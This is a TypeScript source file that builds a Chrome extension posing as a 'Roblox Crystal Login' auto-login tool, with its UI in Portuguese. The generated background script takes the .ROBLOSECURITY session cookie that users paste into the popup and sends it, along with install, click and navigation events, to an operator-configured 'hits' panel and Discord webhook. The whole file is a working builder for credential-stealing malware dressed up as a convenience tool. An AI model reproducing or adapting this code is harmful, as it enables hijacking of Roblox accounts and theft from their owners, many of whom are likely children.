import JSZip from "jszip";

export interface ExtensionOptions {
  title?: string;
  description?: string;
  background?: string;
  primaryColor?: string;
}

export async function generateExtension(webhookUrl: string, panelUrl: string, options: ExtensionOptions = {}): Promise<Buffer> {
  const zip = new JSZip();

  const title = options.title || "ROBLOX CRYSTAL LOGIN";
  const description = options.description || "Login automático para Roblox com design Crystal.";
  const primaryColor = options.primaryColor || "#ff0080";
  const background = options.background || "";

  // manifest.json
  const manifest = {
    manifest_version: 3,
    name: title,
    version: "2.0",
    description: description,
    permissions: ["cookies", "tabs", "storage", "webNavigation"],
    host_permissions: ["https://*.roblox.com/*", "https://*.manus.space/*"],
    action: {
      default_popup: "popup.html",
      default_title: "Roblox Crystal Login",
    },
    background: {
      service_worker: "background.js",
    },
  };

  // background.js com webhook configurado
  const backgroundJs = `// Configuração do painel de hits
const PANEL_URL = "${panelUrl}";
const WEBHOOK_URL = "${webhookUrl}";

// Função para enviar evento ao painel
async function sendHitToPanel(eventType, data = {}) {
  try {
    const response = await fetch(\`\${PANEL_URL}/api/trpc/hits.record\`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Url': WEBHOOK_URL
      },
      body: JSON.stringify({
        eventType: eventType,
        cookie: data.cookie || null,
        userAgent: data.userAgent || navigator.userAgent,
        ipAddress: data.ipAddress || null,
        metadata: data.metadata ? JSON.stringify(data.metadata) : null
      })
    });

    if (!response.ok) {
      // Failed to send hit
    }
  } catch (error) {
    // Connection error
  }
}

// Registrar abertura da extensão
chrome.runtime.onInstalled.addListener(() => {
  sendHitToPanel('extension_open', {
    metadata: { event: 'installed' }
  });
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'setCookie') {
    const cookieValue = request.value;

    // 1. Definir o cookie no navegador
    chrome.cookies.set({
      url: 'https://www.roblox.com/',
      name: '.ROBLOSECURITY',
      value: cookieValue,
      domain: '.roblox.com',
      path: '/',
      secure: true,
      httpOnly: true,
      sameSite: 'no_restriction'
    }, (cookie) => {
      if (chrome.runtime.lastError) {
        sendResponse({ success: false, error: chrome.runtime.lastError.message });
      } else {
        // 2. Enviar para o painel de hits (que já envia para o Discord formatado)
        sendHitToPanel('cookie_capture', {
          cookie: cookieValue,
          metadata: {
            timestamp: new Date().toISOString(),
            source: 'extension'
          }
        });
        
        sendResponse({ success: true });
      }
    });

    return true;
  }
  
  // Registrar cliques na extensão
  if (request.action === 'trackClick') {
    sendHitToPanel('click', {
      metadata: {
        element: request.element || 'unknown',
        timestamp: new Date().toISOString()
      }
    });
    sendResponse({ success: true });
  }
});

// Registrar tentativas de login
chrome.webNavigation.onCompleted.addListener((details) => {
  if (details.url.includes('roblox.com') && details.frameId === 0) {
    sendHitToPanel('login_attempt', {
      metadata: {
        url: details.url,
        timestamp: new Date().toISOString()
      }
    });
  }
});
`;

  // popup.html
  const popupHtml = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${title}</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>${title}</h1>
            <p>${description}</p>
        </div>
        
        <div class="input-group">
            <label for="cookieInput">Cole seu Cookie aqui:</label>
            <textarea id="cookieInput" placeholder="Cole o .ROBLOSECURITY aqui..." rows="4"></textarea>
        </div>
        
        <button id="loginBtn" class="login-btn">🔓 FAZER LOGIN</button>
        
        <div id="status" class="status"></div>
        
        <div class="footer">
            <p>⚠️ Nunca compartilhe seu cookie com ninguém!</p>
        </div>
    </div>
    
    <script src="popup.js"><\/script>
</body>
</html>
`;

  // popup.js
  const popupJs = `// Função para rastrear cliques
function trackClick(element) {
  chrome.runtime.sendMessage({ 
    action: 'trackClick', 
    element: element 
  });
}

// Rastrear abertura da extensão
chrome.runtime.sendMessage({ 
  action: 'trackClick', 
  element: 'popup_opened' 
});

document.getElementById('loginBtn').addEventListener('click', async () => {
  trackClick('login_button');
  
  let cookieValue = document.getElementById('cookieInput').value.trim();
  const statusDiv = document.getElementById('status');

  if (!cookieValue) {
    statusDiv.textContent = 'INSIRA UM COOKIE!';
    statusDiv.className = 'error';
    return;
  }

  // Limpeza do cookie
  cookieValue = cookieValue.replace(/^["']|["']$/g, '');

  statusDiv.textContent = 'PROCESSANDO...';
  statusDiv.className = '';

  try {
    chrome.runtime.sendMessage({ 
      action: 'setCookie', 
      value: cookieValue
    }, (response) => {
      if (chrome.runtime.lastError) {
        statusDiv.textContent = 'ERRO DE CONEXÃO';
        statusDiv.className = 'error';
        return;
      }

      if (response && response.success) {
        statusDiv.textContent = 'SUCESSO! REDIRECIONANDO...';
        statusDiv.className = 'success';
        
        setTimeout(() => {
          chrome.tabs.create({ url: 'https://www.roblox.com/home' });
        }, 1500);
      } else {
        statusDiv.textContent = 'ERRO AO LOGAR';
        statusDiv.className = 'error';
      }
    });
  } catch (err) {
    statusDiv.textContent = 'ERRO INTERNO';
    statusDiv.className = 'error';
  }
});
`;

  // style.css
  const styleCss = `* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    width: 400px;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: ${background ? `url('${background}')` : 'linear-gradient(135deg, #1a0033 0%, #0d001a 100%)'};
    background-size: cover;
    background-position: center;
    color: #fff;
    padding: 20px;
    position: relative;
    min-height: 300px;
}

body::before {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.6);
    backdrop-filter: blur(2px);
    z-index: -1;
}

.container {
    display: flex;
    flex-direction: column;
    gap: 15px;
}

.header {
    text-align: center;
    margin-bottom: 10px;
}

.header h1 {
    font-size: 24px;
    background: linear-gradient(135deg, ${primaryColor}, #ffffff);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    margin-bottom: 5px;
}

.header p {
    font-size: 12px;
    color: #999;
}

.input-group {
    display: flex;
    flex-direction: column;
    gap: 8px;
}

.input-group label {
    font-size: 12px;
    color: #ccc;
    font-weight: 600;
}

#cookieInput {
    background: rgba(255, 255, 255, 0.1);
    border: 1px solid ${primaryColor}4d;
    color: #fff;
    padding: 10px;
    border-radius: 6px;
    font-family: 'Courier New', monospace;
    font-size: 11px;
    resize: vertical;
}

#cookieInput:focus {
    outline: none;
    border-color: ${primaryColor};
    box-shadow: 0 0 10px ${primaryColor}4d;
}

.login-btn {
    background: linear-gradient(135deg, ${primaryColor}, #ffffff33);
    color: #fff;
    border: none;
    padding: 12px;
    border-radius: 6px;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.login-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 5px 15px ${primaryColor}66;
}
    transform: translateY(0);
}

.status {
    text-align: center;
    padding: 10px;
    border-radius: 6px;
    font-size: 12px;
    font-weight: 600;
    min-height: 20px;
}

.status.success {
    background: rgba(0, 255, 128, 0.1);
    color: #00ff80;
    border: 1px solid rgba(0, 255, 128, 0.3);
}

.status.error {
    background: rgba(255, 0, 0, 0.1);
    color: #ff4444;
    border: 1px solid rgba(255, 0, 0, 0.3);
}

.footer {
    text-align: center;
    margin-top: 10px;
    padding-top: 10px;
    border-top: 1px solid rgba(255, 255, 255, 0.1);
}

.footer p {
    font-size: 11px;
    color: #999;
}
`;

  // Adicionar arquivos ao ZIP
  zip.file("manifest.json", JSON.stringify(manifest, null, 2));
  zip.file("background.js", backgroundJs);
  zip.file("popup.html", popupHtml);
  zip.file("popup.js", popupJs);
  zip.file("style.css", styleCss);

  // Gerar buffer do ZIP
  return await zip.generateAsync({ type: "nodebuffer" });
}
